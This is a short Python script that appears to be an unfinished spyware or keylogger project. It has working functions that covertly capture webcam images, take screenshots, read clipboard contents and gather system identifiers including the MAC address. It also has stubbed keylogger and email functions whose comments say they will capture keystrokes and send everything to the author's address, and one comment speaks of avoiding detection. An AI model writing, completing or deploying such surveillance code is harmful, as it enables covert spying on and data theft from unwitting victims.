from pynput import keyboard
import time
import cv2
from PIL import ImageGrab
import pyperclip
import uuid
import platform


# Function to take an image from the webcam
def webcam_image():
    # Gains access to the webcam
    webcam_port = 0
    webcam = cv2.VideoCapture(webcam_port)
    # Waits 0.1 seconds to stop the image being a black screen
    time.sleep(0.1)
    # Saves image to a variable
    return_value, image = webcam.read()
    cv2.imwrite("webcam.png", image)
    # Deletes the variable so that webcam becomes unlocked (decreases chance of detection)
    del webcam


def keylogger():
    print("test")
    # capture keystrokes and return them


def take_screenshot():
    # assign the name of the screenshot
    filepath = 'screenshot.png'
    # take screenshot
    screenshot = ImageGrab.grab()
    # save screenshot to a png file
    screenshot.save(filepath, 'PNG')


def clipboard():
    # Read the data from the clipboard
    data = pyperclip.paste()
    # Print the data if not empty
    if data == "":
        print("Clipboard is empty")
    else:
        print("Clipboard content: " + data)


def system_info():
    # gather platform data
    info = platform.uname()
    # Get MAC_Address
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
    # Put all data in list
    system_data = [info[1], info[5], platform.platform(), mac_address]
    return system_data


def email():
    print("test")
    # gather all data from previous functions and email them to my address


print(system_info())
